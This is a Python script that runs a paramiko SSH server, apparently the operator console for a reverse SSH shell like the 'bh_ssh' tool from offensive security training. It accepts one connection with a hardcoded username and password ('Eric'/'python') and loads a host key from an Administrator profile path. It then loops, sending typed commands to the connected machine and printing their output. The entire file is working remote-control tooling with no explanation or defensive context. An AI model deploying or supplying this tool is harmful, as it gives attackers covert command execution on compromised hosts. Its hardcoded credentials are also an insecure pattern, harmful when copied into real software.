import paramiko
import socket
import threading
import sys

host_key = paramiko.RSAKey(filename='C:\\Users\\Administrator\\.ssh\\id_rsa')

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self,kind,chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self,username,password):
        if (username == 'Eric') and (password == 'python'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
server=sys.argv[1]
ssh_port=int(sys.argv[2])
try:
    sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    sock.bind((server,ssh_port))
    sock.listen(100)
    print('[+]Listening for incoming connection ...')
    client,addr = sock.accept()
except Exception as e:
    print('[-]Listen failed:'+ str(e))
    sys.exit(1)
print ('[+] Got a connection!')

try:
    bhsession = paramiko.Transport(client)
    bhsession.add_server_key(host_key)
    server=Server()
    try:
        bhsession.start_server(server=server)
    except paramiko.SSHException as x:
        print('[-]SSH Negotiation Failed')
    chan = bhsession.accept(20)
    print('[+]Authenticated!')
    print(chan.recv(65535))
    chan.send(b'Welcome to bh_ssh')
    while True:
        try:
            command = input("Enter command:").strip('\n')
            if command != 'exit':
                chan.send(command.encode("utf-8"))
                print(chan.recv(65535).decode("utf-8") + '\n')
            else:
                chan.send(b'exit')
                print ('exiting')
                bhsession.close()
                raise Exception ('exit')
        except KeyboardInterrupt:
            bhsession.close()
except Exception as e:
    print('[-]Caught exception:%s'%str(e))
    try:
        bhsession.close()
    except:
        pass
    sys.exit(1)
